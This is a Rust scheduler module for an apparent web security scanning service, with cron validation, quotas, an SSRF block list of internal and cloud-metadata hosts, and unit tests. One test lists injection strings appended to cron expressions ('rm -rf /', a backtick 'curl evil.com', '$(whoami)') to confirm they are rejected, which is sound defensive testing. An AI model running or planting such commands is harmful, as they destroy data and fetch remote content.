use std::collections::HashSet;
use std::net::IpAddr;
use std::str::FromStr;
use std::sync::Arc;

use chrono::{DateTime, Utc, Duration as ChronoDuration};
use chrono_tz::Tz;
use cron::Schedule;
use serde::{Deserialize, Serialize};
use tokio::time::{interval, Duration};
use tracing::{info, warn, error};
use uuid::Uuid;

use crate::database::Database;
use crate::models::{ScanConfig, Target, TargetStatus};
use crate::priority_queue::{Priority, PriorityScanJob};

/// Configuration for the scheduler
#[derive(Debug, Clone)]
pub struct SchedulerConfig {
    /// Maximum schedules per user
    pub max_schedules_per_user: usize,
    /// Maximum total schedules in system
    pub max_schedules_total: usize,
    /// Minimum interval between runs (minutes)
    pub min_interval_minutes: i64,
    /// Check interval for due schedules (seconds)
    pub check_interval_secs: u64,
    /// Maximum retries before disabling a schedule
    pub max_retries: u32,
}

impl Default for SchedulerConfig {
    fn default() -> Self {
        Self {
            max_schedules_per_user: 10,
            max_schedules_total: 1000,
            min_interval_minutes: 5,
            check_interval_secs: 60,
            max_retries: 3,
        }
    }
}

/// Scan schedule for recurring scans (Issue #11)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanSchedule {
    pub id: Uuid,
    pub target: Target,
    pub config: ScanConfig,
    pub cron_expression: String,
    pub timezone: String,
    pub enabled: bool,
    pub last_run: Option<DateTime<Utc>>,
    pub next_run: DateTime<Utc>,
    pub created_by: String,
    pub created_at: DateTime<Utc>,
    pub retry_count: u32,
    pub priority: Priority,
}

/// Request to create a new schedule
#[derive(Debug, Deserialize)]
pub struct CreateScheduleRequest {
    pub target: String,
    pub config: String,
    pub cron: String,
    #[serde(default = "default_timezone")]
    pub timezone: String,
    #[serde(default)]
    pub priority: Option<Priority>,
}

fn default_timezone() -> String {
    "UTC".to_string()
}

/// Scheduler errors
#[derive(Debug, thiserror::Error)]
pub enum ScheduleError {
    #[error("Invalid cron expression: {0}")]
    InvalidCron(String),
    #[error("Invalid timezone: {0}")]
    InvalidTimezone(String),
    #[error("Schedule runs too frequently (min {0} minutes)")]
    TooFrequent(i64),
    #[error("Maximum schedules per user ({0}) reached")]
    UserQuotaExceeded(usize),
    #[error("Maximum total schedules ({0}) reached")]
    SystemQuotaExceeded(usize),
    #[error("Invalid target: {0}")]
    InvalidTarget(String),
    #[error("Duplicate schedule")]
    Duplicate,
    #[error("No upcoming runs for schedule")]
    NoFutureRuns,
    #[error("Database error: {0}")]
    Database(String),
}

impl ScanSchedule {
    /// Create a new schedule with validation
    /// 
    /// Security validations:
    /// - Cron expression parsing (prevents injection)
    /// - Target validation (prevents SSRF)
    /// - Frequency limits (prevents DoS)
    /// - Timezone validation
    pub fn new(
        target: Target,
        config: ScanConfig,
        cron_expr: &str,
        timezone: &str,
        created_by: String,
        priority: Priority,
    ) -> Result<Self, ScheduleError> {
        // Parse and validate cron expression (prevents command injection)
        let schedule = Schedule::from_str(cron_expr)
            .map_err(|e| ScheduleError::InvalidCron(e.to_string()))?;
        
        // Validate timezone
        let tz: Tz = timezone.parse()
            .map_err(|_| ScheduleError::InvalidTimezone(timezone.to_string()))?;
        
        // Calculate next run
        let now = Utc::now();
        let next_run = schedule.upcoming(Utc).next()
            .ok_or(ScheduleError::NoFutureRuns)?;
        
        // Validate frequency
        Self::validate_frequency(&schedule, &tz, 5)?;
        
        Ok(Self {
            id: Uuid::new_v4(),
            target,
            config,
            cron_expression: cron_expr.to_string(),
            timezone: timezone.to_string(),
            enabled: true,
            last_run: None,
            next_run,
            created_by,
            created_at: now,
            retry_count: 0,
            priority,
        })
    }
    
    /// Validate that schedule doesn't run too frequently
    fn validate_frequency(
        schedule: &Schedule,
        tz: &Tz,
        min_interval_minutes: i64,
    ) -> Result<(), ScheduleError> {
        let now = Utc::now().with_timezone(tz);
        let mut runs_in_window = 0;
        let _window_start = now;
        let window_end = now + ChronoDuration::hours(1);
        
        for datetime in schedule.after(&now).take(100) {
            if datetime < window_end {
                runs_in_window += 1;
            } else {
                break;
            }
        }
        
        // Check if runs are too frequent
        let max_runs_per_hour = 60 / min_interval_minutes;
        if runs_in_window > max_runs_per_hour as usize {
            return Err(ScheduleError::TooFrequent(min_interval_minutes));
        }
        
        Ok(())
    }
    
    /// Calculate the next run time
    pub fn calculate_next_run(&self,
        schedule: &Schedule,
    ) -> Option<DateTime<Utc>> {
        let tz: Tz = self.timezone.parse().ok()?;
        let local_now = Utc::now().with_timezone(&tz);
        schedule.after(&local_now).next()
            .map(|dt| dt.with_timezone(&Utc))
    }
    
    /// Update next run time after execution
    pub fn update_next_run(&mut self,
        schedule: &Schedule,
    ) -> Result<(), ScheduleError> {
        self.last_run = Some(Utc::now());
        self.next_run = self.calculate_next_run(schedule)
            .ok_or(ScheduleError::NoFutureRuns)?;
        Ok(())
    }
}

/// Validates target to prevent SSRF
pub fn validate_target(target: &str) -> Result<(), ScheduleError> {
    use url::Url;
    
    // Parse as URL
    let url = Url::parse(target)
        .or_else(|_| Url::parse(&format!("http://{}", target)))
        .map_err(|_| ScheduleError::InvalidTarget("Invalid URL format".to_string()))?;
    
    // Check scheme
    match url.scheme() {
        "http" | "https" => {},
        _ => return Err(ScheduleError::InvalidTarget(
            "Only HTTP/HTTPS URLs allowed".to_string()
        )),
    }
    
    // Extract host
    let host = url.host_str()
        .ok_or_else(|| ScheduleError::InvalidTarget("Missing host".to_string()))?;
    
    // Block internal IPs and localhost
    let blocked_hosts: HashSet<&str> = [
        "localhost",
        "127.0.0.1",
        "::1",
        "0.0.0.0",
        "[::]",
        "169.254.169.254", // AWS metadata
        "metadata.google.internal", // GCP metadata
        "metadata.google.internal.",
    ].iter().cloned().collect();
    
    if blocked_hosts.contains(host) || host.ends_with(".local") {
        return Err(ScheduleError::InvalidTarget(
            format!("Internal host '{}' not allowed", host)
        ));
    }
    
    // Check if it's an IP address
    if let Ok(ip) = host.parse::<IpAddr>() {
        let is_private = match ip {
            IpAddr::V4(ipv4) => ipv4.is_private(),
            IpAddr::V6(_) => false, // IPv6 doesn't have a standard is_private method
        };
        if ip.is_loopback() || is_private || ip.is_multicast() {
            return Err(ScheduleError::InvalidTarget(
                format!("Private IP '{}' not allowed", ip)
            ));
        }
    }
    
    Ok(())
}

/// Background scheduler task
pub struct Scheduler {
    db: Arc<Database>,
    config: SchedulerConfig,
}

impl Scheduler {
    pub fn new(db: Arc<Database>, config: SchedulerConfig) -> Self {
        Self { db, config }
    }
    
    /// Start the scheduler background task
    pub async fn run(&self,
        queue: Arc<crate::priority_queue::PriorityQueue>,
    ) {
        let mut ticker = interval(Duration::from_secs(self.config.check_interval_secs));
        
        info!("Scheduler started with {}s check interval", self.config.check_interval_secs);
        
        loop {
            ticker.tick().await;
            
            if let Err(e) = self.process_due_schedules(queue.clone()).await {
                error!("Scheduler error: {}", e);
            }
        }
    }
    
    /// Process schedules that are due
    async fn process_due_schedules(
        &self,
        queue: Arc<crate::priority_queue::PriorityQueue>,
    ) -> Result<(), ScheduleError> {
        let now = Utc::now();
        
        // Get due schedules from database
        // Note: This would need to be implemented in Database
        let due_schedules = self.get_due_schedules(now).await?;
        
        for mut schedule in due_schedules {
            // Skip disabled schedules
            if !schedule.enabled {
                continue;
            }
            
            info!(
                "Processing scheduled scan {} for target {}",
                schedule.id, schedule.target.domain
            );
            
            // Create scan job
            let scan_id = Uuid::new_v4();
            let job = PriorityScanJob::new(
                scan_id,
                schedule.target.clone(),
                schedule.config.clone(),
                schedule.priority,
            ).with_user(schedule.created_by.clone());
            
            // Enqueue job
            match queue.enqueue(job).await {
                Ok(_) => {
                    info!("Scheduled scan {} queued successfully", scan_id);
                    
                    // Update schedule
                    let schedule_cron = Schedule::from_str(&schedule.cron_expression)
                        .map_err(|e| ScheduleError::InvalidCron(e.to_string()))?;
                    
                    schedule.update_next_run(&schedule_cron)?;
                    schedule.retry_count = 0;
                    
                    // Save updated schedule
                    self.update_schedule(&schedule).await?;
                }
                Err(e) => {
                    warn!("Failed to queue scheduled scan: {}", e);
                    
                    // Increment retry count
                    schedule.retry_count += 1;
                    
                    if schedule.retry_count >= self.config.max_retries {
                        warn!(
                            "Schedule {} disabled after {} failed retries",
                            schedule.id, schedule.retry_count
                        );
                        schedule.enabled = false;
                    }
                    
                    self.update_schedule(&schedule).await?;
                }
            }
        }
        
        Ok(())
    }
    
    /// Get schedules due before a given time
    /// 
    /// Note: This is a placeholder. The actual implementation would query the database.
    async fn get_due_schedules(
        &self,
        _before: DateTime<Utc>,
    ) -> Result<Vec<ScanSchedule>, ScheduleError> {
        // This would be implemented in Database
        // For now, return empty
        Ok(vec![])
    }
    
    /// Update a schedule in the database
    /// 
    /// Note: This is a placeholder. The actual implementation would update the database.
    async fn update_schedule(
        &self,
        _schedule: &ScanSchedule,
    ) -> Result<(), ScheduleError> {
        // This would be implemented in Database
        Ok(())
    }
}

/// API handler to create a schedule
pub async fn create_schedule(
    db: Arc<Database>,
    config: &SchedulerConfig,
    req: CreateScheduleRequest,
    user_id: String,
) -> Result<ScanSchedule, ScheduleError> {
    // Check user quota
    let user_count = db.count_schedules_by_user(&user_id).await
        .map_err(|e| ScheduleError::Database(e.to_string()))?;
    
    if user_count >= config.max_schedules_per_user {
        return Err(ScheduleError::UserQuotaExceeded(config.max_schedules_per_user));
    }
    
    // Check system quota
    let total_count = db.count_all_schedules().await
        .map_err(|e| ScheduleError::Database(e.to_string()))?;
    
    if total_count >= config.max_schedules_total {
        return Err(ScheduleError::SystemQuotaExceeded(config.max_schedules_total));
    }
    
    // Validate target (SSRF prevention)
    validate_target(&req.target)?;
    
    // Create target
    let target = Target {
        id: Some(Uuid::new_v4()),
        domain: req.target.clone(),
        scope: vec![req.target.clone(), format!("*.{}", req.target)],
        status: TargetStatus::Active,
        created_at: Utc::now(),
        last_scan: None,
        notes: Some("Created by scheduler".to_string()),
    };
    
    // Load config
    let scan_config = if std::path::Path::new(&format!("templates/config/{}.yaml", req.config)).exists() {
        crate::utils::config::ConfigParser::load_from_file(
            &format!("templates/config/{}.yaml", req.config)
        ).unwrap_or_default()
    } else {
        crate::models::ScanConfig::default()
    };
    
    // Check for duplicate
    let exists = db.schedule_exists(&user_id, &req.target, &req.cron).await
        .map_err(|e| ScheduleError::Database(e.to_string()))?;
    
    if exists {
        return Err(ScheduleError::Duplicate);
    }
    
    // Create schedule
    let priority = req.priority.unwrap_or(Priority::Normal);
    let schedule = ScanSchedule::new(
        target,
        scan_config,
        &req.cron,
        &req.timezone,
        user_id,
        priority,
    )?;
    
    // Save to database
    db.save_schedule(&schedule).await
        .map_err(|e| ScheduleError::Database(e.to_string()))?;
    
    info!("Schedule {} created by user {}", schedule.id, schedule.created_by);
    
    Ok(schedule)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_cron_parsing() {
        // Valid cron expressions
        assert!(Schedule::from_str("0 2 * * *").is_ok()); // Daily at 2 AM
        assert!(Schedule::from_str("*/5 * * * *").is_ok()); // Every 5 minutes
        assert!(Schedule::from_str("0 0 * * 0").is_ok()); // Weekly on Sunday
        
        // Invalid expressions
        assert!(Schedule::from_str("invalid").is_err());
        assert!(Schedule::from_str("* * * *").is_err()); // Missing field
    }

    #[test]
    fn test_frequency_validation() {
        let tz: Tz = "UTC".parse().unwrap();
        
        // Too frequent: every minute
        let frequent = Schedule::from_str("* * * * *").unwrap();
        assert!(ScanSchedule::validate_frequency(&frequent, &tz, 5).is_err());
        
        // OK: every 5 minutes
        let ok = Schedule::from_str("*/5 * * * *").unwrap();
        assert!(ScanSchedule::validate_frequency(&ok, &tz, 5).is_ok());
    }

    #[test]
    fn test_target_validation() {
        // Valid targets
        assert!(validate_target("example.com").is_ok());
        assert!(validate_target("https://example.com").is_ok());
        assert!(validate_target("http://sub.example.com/path").is_ok());
        
        // Invalid targets (SSRF prevention)
        assert!(validate_target("http://localhost").is_err());
        assert!(validate_target("http://127.0.0.1").is_err());
        assert!(validate_target("http://169.254.169.254").is_err());
        assert!(validate_target("file:///etc/passwd").is_err());
    }

    #[test]
    fn test_schedule_creation() {
        let target = Target {
            id: Some(Uuid::new_v4()),
            domain: "example.com".to_string(),
            scope: vec!["example.com".to_string()],
            status: TargetStatus::Active,
            created_at: Utc::now(),
            last_scan: None,
            notes: None,
        };
        
        let config = ScanConfig::default();
        
        let schedule = ScanSchedule::new(
            target,
            config,
            "0 2 * * *",
            "UTC",
            "test_user".to_string(),
            Priority::Normal,
        );
        
        assert!(schedule.is_ok());
        let s = schedule.unwrap();
        assert_eq!(s.cron_expression, "0 2 * * *");
        assert!(s.enabled);
    }

    #[test]
    fn test_command_injection_prevention() {
        // These should fail to parse as valid cron
        let malicious = vec![
            "* * * * * ; rm -rf /",
            "* * * * * `curl evil.com`",
            "* * * * * $(whoami)",
        ];
        
        for expr in malicious {
            assert!(
                Schedule::from_str(expr).is_err(),
                "Should reject malicious cron: {}",
                expr
            );
        }
    }
}
